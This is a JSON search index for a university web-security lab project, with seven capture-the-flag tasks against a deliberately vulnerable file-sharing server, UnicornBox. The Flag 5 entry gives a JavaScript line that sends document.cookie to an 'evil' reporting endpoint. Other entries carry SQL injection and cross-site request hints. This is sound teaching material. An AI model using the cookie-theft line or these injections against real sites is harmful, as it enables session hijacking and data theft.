@@ -1,0 +1,158 @@
+{"0": {
+    "doc": "Getting Started2",
+    "title": "Getting Started",
+    "content": "Your task is to find seven vulnerabilities in the UnicornBox servers. When you successfully execute an exploit, the status entry on your scoreboard will change from 0 to a timestamp, to indicate that you have received a flag. Your goal is to collect all seven flags. If you are working with a partner, you need to acquire each flag on your own server to receive credit for it. All your exploits will be done through a web browser. We strongly recommend Firefox or Chrome. To get started, open https://proj3.cs161.org and log in with your Berkeley account. On this splash page, you can view your progress and reset the server (see below). Note that all the vulnerabilities will be at the vulnerable server https://proj3.cs161.org/site—there are no flags on the splash page. ",
+    "url": "http://localhost:4000/proj3/8899.html#getting-started",
+    "relUrl": "/8899.html#getting-started"
+  },"1": {
+    "doc": "Getting Started2",
+    "title": "Writeup",
+    "content": "Each group must submit writeup–two pages maximum, please. For each of flags 3–7 only, include a brief description (2–3 sentences) of how you acquired the flag, and a suggestion (a line of code or 2–3 sentences) for how to protect against your exploit. ",
+    "url": "http://localhost:4000/proj3/8899.html#writeup",
+    "relUrl": "/8899.html#writeup"
+  },"2": {
+    "doc": "Getting Started2",
+    "title": "Grading &amp; Deliverables",
+    "content": ". | 70 points for finding exploits (10 points for each flag). You do not need to submit anything, since flags are automatically registered on the server. | 30 points for the writeup (6 points for each of flags 3–7). Submit a writeup to Gradescope, and remember to add your partner if you worked in a group. | . ",
+    "url": "http://localhost:4000/proj3/8899.html#grading--deliverables",
+    "relUrl": "/8899.html#grading--deliverables"
+  },"3": {
+    "doc": "Getting Started2",
+    "title": "Additional Notes",
+    "content": ". | The difficulty rating of each flag is based on students’ experience from past semesters. You might find some of the hard-rated flags easy, and some of the easy-rated flags hard. Feel free to work on them in any order you choose. | In case you break the vulnerable server beyond repair, you can reset the database used by the server and clear all stored files. Resetting will not clear your scoreboard progress. | Please do not DoS our server. None of the exploits require brute-force. | . ",
+    "url": "http://localhost:4000/proj3/8899.html#additional-notes",
+    "relUrl": "/8899.html#additional-notes"
+  },"4": {
+    "doc": "Getting Started2",
+    "title": "Getting Started2",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/8899.html",
+    "relUrl": "/8899.html"
+  },"5": {
+    "doc": "Flag 1: dev",
+    "title": "Log in as user dev",
+    "content": "Difficulty: Easy . Developers use an account with the username dev to perform quality assurance testing on UnicornBox. Fortunately for us, they’re sloppy and haven’t cleaned up any leftover comments before releasing UnicornBox. See if you can find a way to get dev’s password and log in. Your task: Log in as user dev through the login page. Note that gaining access to dev’s account through other means will not satisfy this flag. ",
+    "url": "http://localhost:4000/proj3/flag1.html#log-in-as-user-dev",
+    "relUrl": "/flag1.html#log-in-as-user-dev"
+  },"6": {
+    "doc": "Flag 1: dev",
+    "title": "Flag 1: dev",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag1.html",
+    "relUrl": "/flag1.html"
+  },"7": {
+    "doc": "Flag 2: ip.txt",
+    "title": "Change the text of ip.txt",
+    "content": "Difficulty: Easy . The cs161 user is using UnicornBox to store a file called ip.txt. cs161 is a special-purpose account on UnicornBox. It uses a separate login mechanism, so you won’t be able to log in as cs161, but you may still be able to change some of its files. Your task: Change the contents of cs161 user’s ip.txt file to be 161.161.161.161. ",
+    "url": "http://localhost:4000/proj3/flag2.html#change-the-text-of-iptxt",
+    "relUrl": "/flag2.html#change-the-text-of-iptxt"
+  },"8": {
+    "doc": "Flag 2: ip.txt",
+    "title": "Flag 2: ip.txt",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag2.html",
+    "relUrl": "/flag2.html"
+  },"9": {
+    "doc": "Flag 3: shomil",
+    "title": "Obtain shomil’s password hash",
+    "content": "Difficulty: Medium . The UnicornBox database uses the following table users to store its accounts: . CREATE TABLE IF NOT EXISTS users ( username TEXT, md5_hash TEXT, -- Additional fields not shown. ); . Your Task: Steal the password hash for user shomil. Tip: You may execute multiple statements in one line separated by semicolons in SQL, but it will only return the results of the last query if it does not have a semicolon. SELECT '123'; SELECT '456' -- returns '456' SELECT '123'; SELECT '456'; -- returns nothing . ",
+    "url": "http://localhost:4000/proj3/flag3.html#obtain-shomils-password-hash",
+    "relUrl": "/flag3.html#obtain-shomils-password-hash"
+  },"10": {
+    "doc": "Flag 3: shomil",
+    "title": "Flag 3: shomil",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag3.html",
+    "relUrl": "/flag3.html"
+  },"11": {
+    "doc": "Flag 4: nicholas",
+    "title": "Gain access to nicholas’s account",
+    "content": "Difficulty: Hard . UnicornBox uses token-based authentication. The database stores a table that maps session tokens to users: . CREATE TABLE IF NOT EXISTS sessions ( username TEXT, token TEXT, -- Additional fields not shown. ); . Whenever an HTTP request is received, the server checks for a session_token value in the cookie. If the cookie contains a token, the server selects the username corresponding to that token from the sessions table. Your task: Gain access to nicholas’s account. Tip: Cookie values may contain anything other than semicolons, which are used as delimiters in cookie syntax. ",
+    "url": "http://localhost:4000/proj3/flag4.html#gain-access-to-nicholass-account",
+    "relUrl": "/flag4.html#gain-access-to-nicholass-account"
+  },"12": {
+    "doc": "Flag 4: nicholas",
+    "title": "Flag 4: nicholas",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag4.html",
+    "relUrl": "/flag4.html"
+  },"13": {
+    "doc": "Flag 5: cs161",
+    "title": "Leak cs161’s session cookie",
+    "content": "Difficulty: Medium . Because it is a special-purpose account, you won’t find cs161’s session token in the database. However, cs161 still sends a session_token cookie to the server with every request, so you might be able to leak cs161’s token using a different attack. Your CS161 alumni ally has inserted some evil malware that lets you log arbitrary values to an internal dashboard. When you send a HTTP GET Request to the /evil/report endpoint and include a message parameter, the message is posted to the /evil/logs page. Try it by visiting the following URL in your browser! . https://proj3.cs161.org/evil/report?message=hello1234 . Your task: Leak cs161’s session cookie by pushing it onto the /evil/logs page. Tip: You may want to try this attack on yourself before executing it on another user. Tip: You may find this block of JavaScript code useful: . fetch('/evil/report?message='+document.cookie) . Tip: You may assume the cs161 user will be browsing the main pages of the site in the background (e.g. home, list, upload, etc.). ",
+    "url": "http://localhost:4000/proj3/flag5.html#leak-cs161s-session-cookie",
+    "relUrl": "/flag5.html#leak-cs161s-session-cookie"
+  },"14": {
+    "doc": "Flag 5: cs161",
+    "title": "Flag 5: cs161",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag5.html",
+    "relUrl": "/flag5.html"
+  },"15": {
+    "doc": "Flag 6: delete",
+    "title": "Create a link that deletes users’ files",
+    "content": "Difficulty: Medium . For convenience, UnicornBox allows you to quickly and easily delete all the files you have in your account, with the click of a single button. As an attempt to remain secure, they have made sure that only POST requests will actually delete the files—GET requests will not succeed. In addition, they have implemented a cross-origin resource sharing (CORS) policy that denies POST requests from any external origin. This means that POST requests to delete all files only succeed if they originate from the UnicornBox website. Your task: Create a link that deletes user’s files. Once you have figured it out, execute the attack on yourself to earn the flag! . Note that this link must work for any logged in user, not just yourself. In other words, you must be able to email or text this link to someone else, and when they click the link, their files are immediately deleted. Tip: To make a POST Request in JavaScript, use this line of code: . fetch('[URL]',{method:'POST'}) . Note that there is no semicolon at the end. For example, to make a POST request to auth.berkeley.edu, you would run the following JavaScript: . fetch('https://auth.berkeley.edu/',{method:'POST'}) . ",
+    "url": "http://localhost:4000/proj3/flag6.html#create-a-link-that-deletes-users-files",
+    "relUrl": "/flag6.html#create-a-link-that-deletes-users-files"
+  },"16": {
+    "doc": "Flag 6: delete",
+    "title": "Flag 6: delete",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag6.html",
+    "relUrl": "/flag6.html"
+  },"17": {
+    "doc": "Flag 7: admin",
+    "title": "Gain access to the admin panel",
+    "content": "Difficulty: Hard . UnicornBox has a special panel for administrators. Your final task is to log into the admin panel. Password authentication for the admin panel is handled separately from the database. However, the administrator does use UnicornBox for day-to-day file storage, so they may also have a normal user account. Your task: Gain access to the admin panel. Tip: Neither nicholas nor shomil are administrators of the site. Your first step might be to figure out the username of the administrator. Tip: Consider human factors. Many people reuse passwords. Tip: We recommend completing Flag 3 before trying this flag. ",
+    "url": "http://localhost:4000/proj3/flag7.html#gain-access-to-the-admin-panel",
+    "relUrl": "/flag7.html#gain-access-to-the-admin-panel"
+  },"18": {
+    "doc": "Flag 7: admin",
+    "title": "Flag 7: admin",
+    "content": " ",
+    "url": "http://localhost:4000/proj3/flag7.html",
+    "relUrl": "/flag7.html"
+  },"19": {
+    "doc": "Getting Started",
+    "title": "Getting Started",
+    "content": "Your task is to find seven vulnerabilities in the UnicornBox servers. When you successfully execute an exploit, the status entry on your scoreboard will change from 0 to a timestamp, to indicate that you have received a flag. Your goal is to collect all seven flags. If you are working with a partner, you need to acquire each flag on your own server to receive credit for it. All your exploits will be done through a web browser. We strongly recommend Firefox or Chrome. To get started, open https://proj3.cs161.org and log in with your Berkeley account. On this splash page, you can view your progress and reset the server (see below). Note that all the vulnerabilities will be at the vulnerable server https://proj3.cs161.org/site—there are no flags on the splash page. ",
+    "url": "http://localhost:4000/proj3/getting-started.html",
+    "relUrl": "/getting-started.html"
+  },"20": {
+    "doc": "Getting Started",
+    "title": "Writeup",
+    "content": "Each group must submit writeup–two pages maximum, please. For each of flags 3–7 only, include a brief description (2–3 sentences) of how you acquired the flag, and a suggestion (a line of code or 2–3 sentences) for how to protect against your exploit. ",
+    "url": "http://localhost:4000/proj3/getting-started.html#writeup",
+    "relUrl": "/getting-started.html#writeup"
+  },"21": {
+    "doc": "Getting Started",
+    "title": "Grading &amp; Deliverables",
+    "content": ". | 70 points for finding exploits (10 points for each flag). You do not need to submit anything, since flags are automatically registered on the server. | 30 points for the writeup (6 points for each of flags 3–7). Submit a writeup to Gradescope, and remember to add your partner if you worked in a group. | . ",
+    "url": "http://localhost:4000/proj3/getting-started.html#grading--deliverables",
+    "relUrl": "/getting-started.html#grading--deliverables"
+  },"22": {
+    "doc": "Getting Started",
+    "title": "Additional Notes",
+    "content": ". | The difficulty rating of each flag is based on students’ experience from past semesters. You might find some of the hard-rated flags easy, and some of the easy-rated flags hard. Feel free to work on them in any order you choose. | In case you break the vulnerable server beyond repair, you can reset the database used by the server and clear all stored files. Resetting will not clear your scoreboard progress. | Please do not DoS our server. None of the exploits require brute-force. | . ",
+    "url": "http://localhost:4000/proj3/getting-started.html#additional-notes",
+    "relUrl": "/getting-started.html#additional-notes"
+  },"23": {
+    "doc": "Breaching a Vulnerable Web Server",
+    "title": "Breaching a Vulnerable Web Server",
+    "content": "In this project, you will exploit a poorly designed website. This project may be done individually or in groups of two. ",
+    "url": "http://localhost:4000/proj3/",
+    "relUrl": "/"
+  },"24": {
+    "doc": "Story",
+    "title": "Story",
+    "content": "Just for fun, no project-relevant content on this page. Your plan to defeat REGULUS’s surveillance with cryptography is a huge success. With the help of EvanBot’s friends on the inside, you create a huge underground network of rebellious Kaltupia employees. Together, you leak records of Kaltupia’s evil schemes to the press, inject malware that causes massive Kaltupia service outages, and disrupt Kaltupia’s surveillance operations. As a result of your efforts, the public is quickly losing faith in Kaltupia. People are no longer rushing to the Kaltupia Stores to buy the weekly new model of the KalPhone. Public interest in learning computer security increases by 300\\%. Memes of Phisher in a guillotine start to go viral. Kaltupia, of course, does not take all this lying down. Furious at all the encrypted content in REGULUS, Phisher decides to launch a last-ditch effort to preserve Kaltupia. UnicornDox is a small startup founded by CS 161 alumni that has developed a state-of-the-art algorithm for breaking even the strongest encryption schemes. Seeing an opportunity, Phisher immediately absorbs the startup, fires all the employees, and merges their code into REGULUS. The result is rebranded as UnicornBox (UNIversal Centralized Online Regulatory Network BOX) and unveiled to the public as Kaltupia’s latest and greatest file-sharing service. Just like that, all seems hopeless again. Without encryption, you cannot contact your allies on UnicornBox anymore. But not all hope is lost–it turns out one of the CS 161 alumni was part of your REGULUS operation, and fearing this exact situation, they left many vulnerabilities in the UnicornBox source code for you to discover. With the help of the trusty EvanBot and your knowledge of web security, exploit all the vulnerablities to destroy the UnicornBox web server, deal the finishing blow to Kaltupia, and restore freedom, privacy, and justice across the land. ",
+    "url": "http://localhost:4000/proj3/story.html",
+    "relUrl": "/story.html"
+  },"25": {
+    "doc": "General Tips",
+    "title": "General Tips",
+    "content": "Here are some general tips for the whole project. | We recommend completing Q1 of Homework 6 before starting this project. | Because the website is black-box (you don’t have the source code), you will need to perform SQL injection attacks without seeing the query and the response. We recommend first writing out what you think the backend query is, with blanks where you think user input is substituted. Next, think about where on the website the user input comes from. Finally, write out an injection attack and enter it where you think the user input comes from. This may take some trial and error before you succeed. | The backend for this project exclusively uses single quotes for SQL queries. | It is possible to select constants in SQL rather than selecting column names. For example, SELECT 1, 'foo', 'evan' will return a single row with 3 columns, with values of 1, 'foo' and 'evan'. You may find this useful if you can guess the format of the rows being selected in one of the server’s SQL queries. | Consider looking into the UNION keyword to return the result of two queries without usage of a semicolon. | . ",
+    "url": "http://localhost:4000/proj3/tips.html",
+    "relUrl": "/tips.html"
+  }
+}
